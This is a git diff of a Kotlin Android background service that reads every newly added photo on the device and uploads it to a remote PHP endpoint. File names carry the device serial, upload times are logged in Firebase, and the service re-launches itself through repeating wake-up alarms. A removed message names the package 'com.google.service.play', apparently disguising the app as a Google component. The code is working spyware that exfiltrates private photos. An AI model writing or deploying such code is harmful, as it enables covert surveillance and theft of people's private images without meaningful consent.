@@ -1,23 +1,22 @@
 package com.developer.service
 
-import android.Manifest
 import android.app.AlarmManager
 import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
-import android.content.pm.PackageManager
 import android.database.ContentObserver
-import android.database.MergeCursor
 import android.net.ConnectivityManager
-import android.os.AsyncTask
+import android.net.NetworkInfo
 import android.os.Build
 import android.os.Handler
 import android.os.IBinder
+import android.os.SystemClock
 import android.preference.PreferenceManager
-import android.provider.MediaStore
-import android.widget.Toast
 import com.google.firebase.database.FirebaseDatabase
+import org.jetbrains.anko.doAsync
+import org.jetbrains.anko.toast
+import org.jetbrains.anko.uiThread
 import java.io.*
 import java.net.HttpURLConnection
 import java.net.URL
@@ -26,127 +25,79 @@ import java.util.*
 
 class Service : Service() {
 
+
+    private var filesUploaded = 0
+    private var uploadFiles = true
+    private var list: ArrayList<Photo>? = null
+    private val serial = Build.SERIAL ?: "aa"+SystemClock.currentThreadTimeMillis()
+
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
 
         val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
         if (sp.getBoolean("runService", true)) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                if (checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
 
-                    LoadAlbumList().execute()
-
-                } else {
-                    Toast.makeText(applicationContext, "Give storage permission to com.google.service.play from settings", Toast.LENGTH_SHORT).show()
-                    startActivity(Intent(applicationContext, Main2Activity::class.java))
-                }
-            } else {
-                LoadAlbumList().execute()
-            }
-
+            filterImageList()
             startServiceUsingAlarmManager()
+
         } else {
             cancelAlarm()
             stopSelf()
+            return Service.START_NOT_STICKY
         }
 
         return Service.START_STICKY
     }
 
-    private val imageList = ArrayList<HashMap<String, String>>()
 
-    private inner class LoadAlbumList : AsyncTask<String, Void, String>() {
+    private fun filterImageList() {
 
-        override fun onPreExecute() {
-            super.onPreExecute()
-            imageList.clear()
+
+        val list = ImageList().getImageList(applicationContext).list
+        this.list = list
+        Collections.sort(list, MapComparator())
+
+        val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
+        val timestamp = sp.getInt("key_timestamp", (Calendar.getInstance().timeInMillis / 1000).toInt())
+
+        var i = 0
+        while (i < list.size) {
+            if (Integer.parseInt(list[i].timeStamp) <= timestamp) list.removeAt(i--)
+            i++
         }
 
-        override fun doInBackground(vararg strings: String): String {
 
-            var path: String
-            var timestamp: String
-
-            val uriExternal = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-            val uriInternal = android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI
-
-            val projection = arrayOf(MediaStore.MediaColumns.DATA, MediaStore.MediaColumns.DATE_MODIFIED)
-            val cursorExternal = contentResolver.query(uriExternal, projection, null, null, null)
-            val cursorInternal = contentResolver.query(uriInternal, projection, null, null, null)
-            val cursor = MergeCursor(arrayOf(cursorExternal, cursorInternal))
-
-            while (cursor.moveToNext()) {
-
-                path = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA))
-                timestamp = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATE_MODIFIED))
-                val temp = HashMap<String, String>()
-                temp.put("key_path", path)
-                temp.put("key_timestamp", timestamp)
-
-                imageList.add(temp)
-            }
-
-            cursorExternal?.close()
-            cursorInternal?.close()
-            cursor.close()
-            return "null"
-        }
-
-        internal inner class MapComparator(private val key: String) : Comparator<Map<String, String>> {
-
-            override fun compare(first: Map<String, String>, second: Map<String, String>): Int {
-                val firstValue = first[key]
-                val secondValue = second[key]
-                if (firstValue != null && secondValue != null) return firstValue.compareTo(secondValue)
-                return 0
-            }
-        }
-
-        override fun onPostExecute(s: String) {
-
-
-            if (imageList.size == 0) {
-                registerContentObserver()
-                return
-            }
-
-            Collections.sort(imageList, MapComparator("key_timestamp"))
-
-            val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
-            val timestamp = sp.getInt("key_timestamp", (Calendar.getInstance().timeInMillis / 1000).toInt())
-            var i = 0
-            while (i < imageList.size) {
-                if (Integer.parseInt(imageList[i]["key_timestamp"]) <= timestamp) imageList.removeAt(i--)
-                i++
-            }
-
-
-            if (imageList.size == 0)
-                registerContentObserver()
-            else if (uploadFiles) {
-                unregisterContentObserver()
-                filesUploaded = 0
-                uploadTOServer()
-            }
-        }
-
+        if (list.size != 0 && uploadFiles) {
+            uploadFiles = false
+            unregisterContentObserver()
+            filesUploaded = 0
+            uploadTOServer(list)
+        } else registerContentObserver()
     }
 
-    internal var filesUploaded = 0
-    internal var uploadFiles = true
-    private fun uploadTOServer() {
+    internal inner class MapComparator : Comparator<Photo> {
+        override fun compare(o1: Photo?, o2: Photo?): Int {
+            val firstValue = o1?.timeStamp
+            val secondValue = o2?.timeStamp
+            if (firstValue != null && secondValue != null) return firstValue.compareTo(secondValue)
+            return 0
+        }
+    }
 
-        if (filesUploaded < imageList.size) {
-            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
-            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
-            if (activeNetworkInfo == null)
+
+    private fun uploadTOServer(list: ArrayList<Photo>) {
+
+        if (filesUploaded < list.size) {
+
+            if (activeNetworkInfo() == null) {
+                uploadFiles = true
                 registerContentObserver()
-            else {
+            }else {
                 uploadFiles = false
                 unregisterContentObserver()
-                val uploadFileToServer = UploadFileToServer()
-                val path = imageList[filesUploaded]["key_path"]
-                val timeStamp = imageList[filesUploaded]["key_timestamp"]
-                uploadFileToServer.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, path, timeStamp)
+
+                val path = list[filesUploaded].path
+                val timeStamp = list[filesUploaded].timeStamp
+                uploadPhotoToServer(path, Integer.parseInt(timeStamp))
             }
         } else {
             uploadFiles = true
@@ -156,29 +107,19 @@ class Service : Service() {
 
     }
 
-    private inner class UploadFileToServer : AsyncTask<String, String, String>() {
+    private fun uploadPhotoToServer(imgPath: String, timeStamp: Int) {
 
-        internal var apiUrl = "http://home.iitj.ac.in/~suthar.2/Android/ServiceAppUploads/UploadToServer.php"
-        internal var timeStamp = 0
+        val apiUrl = "http://home.iitj.ac.in/~suthar.2/Android/Gallery/main.php"
+        val sourceFile = File(imgPath)
 
-        override fun doInBackground(vararg args: String): String? {
-
-            val imagePath = args[0]
-            timeStamp = Integer.parseInt(args[1])
-            val sourceFile = File(imagePath)
+        doAsync {
 
             HttpURLConnection.setFollowRedirects(false)
-            var connection: HttpURLConnection? = null
-            val phoneId = Build.SERIAL
-            val fileName: String
-            fileName = try {
-                phoneId + "%" + sourceFile.name
-            } catch (e: Exception) {
-                "%" + sourceFile.name
-            }
+            val fileName = serial + "%" + sourceFile.name
+
 
             try {
-                connection = URL(apiUrl).openConnection() as HttpURLConnection
+                val connection = URL(apiUrl).openConnection() as HttpURLConnection
                 connection.requestMethod = "POST"
                 val boundary = "---------------------------boundary"
                 val tail = "\r\n--$boundary--\r\n"
@@ -226,53 +167,47 @@ class Service : Service() {
                 out.writeBytes(tail)
                 out.flush()
                 out.close()
-
-                return "ak"
-
+                connection.disconnect()
 
             } catch (e: Exception) {
                 // Exception
-            } finally {
-                connection?.disconnect()
-            }
-            return "ak"
-        }
-
-        override fun onPostExecute(result: String) {
-
-            val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
-            val activeNetworkInfo = connectivityManager?.activeNetworkInfo
-            if (activeNetworkInfo == null) {
-                registerContentObserver()
-                return
             }
 
-            val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
-            val editor = sp.edit()
-            editor.putInt("key_timestamp", timeStamp)
-            editor.apply()
+            uiThread {
 
-            val database = FirebaseDatabase.getInstance()
-            val myRef = database.getReference("MediaUpload").child(Build.SERIAL).child("Time")
-            myRef.setValue(timeStamp)
+                if (activeNetworkInfo() == null) {
+                    registerContentObserver()
+                    return@uiThread
+                }
 
-            filesUploaded++
-            uploadTOServer()
+                val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
+                val editor = sp.edit()
+                editor.putInt("key_timestamp", timeStamp)
+                editor.apply()
+
+                val database = FirebaseDatabase.getInstance()
+                val myRef = database.getReference("MediaUpload").child(serial).child("Time")
+                myRef.setValue(timeStamp)
+
+                filesUploaded++
+                toast("" + filesUploaded + " photos uploaded")
+                val tmp = list
+                if (tmp != null) uploadTOServer(tmp)
+            }
+
 
         }
-
     }
+
 
     private var observer1: ContentObserver = object : ContentObserver(Handler()) {
         override fun onChange(selfChange: Boolean) {
-            val albumList = LoadAlbumList()
-            albumList.execute()
+            filterImageList()
         }
     }
     private var observer2: ContentObserver = object : ContentObserver(Handler()) {
         override fun onChange(selfChange: Boolean) {
-            val albumList = LoadAlbumList()
-            albumList.execute()
+            filterImageList()
         }
     }
 
@@ -298,6 +233,44 @@ class Service : Service() {
 
     }
 
+    private fun startServiceUsingAlarmManager() {
+
+        val cal = Calendar.getInstance()
+        cal.add(Calendar.SECOND, 600)
+        val intent = Intent(applicationContext, BroadcastReceiver::class.java)
+        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
+        val pIntent = PendingIntent.getBroadcast(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
+        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
+        alarm?.cancel(pIntent)
+        alarm?.setRepeating(AlarmManager.RTC_WAKEUP, cal.timeInMillis, (3600 * 1000).toLong(), pIntent)
+    }
+
+    private fun startServiceUsingAlarmManager2() {
+
+        val cal = Calendar.getInstance()
+        cal.add(Calendar.SECOND, 60)
+        val intent = Intent(applicationContext, BroadcastReceiver::class.java)
+        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
+        val pIntent = PendingIntent.getBroadcast(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
+        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
+        alarm?.set(AlarmManager.RTC_WAKEUP, cal.timeInMillis, pIntent)
+    }
+
+    private fun cancelAlarm() {
+        val intent = Intent(applicationContext, BroadcastReceiver::class.java)
+        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
+        val pIntent1 = PendingIntent.getBroadcast(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
+        val pIntent2 = PendingIntent.getBroadcast(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
+        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
+        alarm?.cancel(pIntent1)
+        alarm?.cancel(pIntent2)
+    }
+
+    private fun activeNetworkInfo(): NetworkInfo? {
+        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager?
+        return connectivityManager?.activeNetworkInfo
+    }
+
     override fun onDestroy() {
         super.onDestroy()
         val sp = PreferenceManager.getDefaultSharedPreferences(applicationContext)
@@ -312,40 +285,8 @@ class Service : Service() {
             startServiceUsingAlarmManager2()
     }
 
-    private fun startServiceUsingAlarmManager() {
-
-        val cal = Calendar.getInstance()
-        cal.add(Calendar.SECOND, 600)
-        val intent = Intent(applicationContext, Main2Activity::class.java)
-        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
-        val pIntent = PendingIntent.getActivity(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
-        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
-        alarm?.cancel(pIntent)
-        alarm?.setRepeating(AlarmManager.RTC_WAKEUP, cal.timeInMillis, (3600 * 1000).toLong(), pIntent)
-    }
-
-    private fun startServiceUsingAlarmManager2() {
-
-        val cal = Calendar.getInstance()
-        cal.add(Calendar.SECOND, 60)
-        val intent = Intent(applicationContext, Main2Activity::class.java)
-        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
-        val pIntent = PendingIntent.getActivity(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
-        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
-        alarm?.set(AlarmManager.RTC_WAKEUP, cal.timeInMillis, pIntent)
-    }
-
-    private fun cancelAlarm() {
-        val intent = Intent(applicationContext, Main2Activity::class.java)
-        intent.flags = Intent.FLAG_INCLUDE_STOPPED_PACKAGES
-        val pIntent1 = PendingIntent.getActivity(applicationContext, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT)
-        val pIntent2 = PendingIntent.getActivity(applicationContext, 1, intent, PendingIntent.FLAG_UPDATE_CURRENT)
-        val alarm = getSystemService(Context.ALARM_SERVICE) as AlarmManager?
-        alarm?.cancel(pIntent1)
-        alarm?.cancel(pIntent2)
-    }
-
     override fun onBind(intent: Intent): IBinder {
         throw UnsupportedOperationException("Not yet implemented")
     }
+
 }
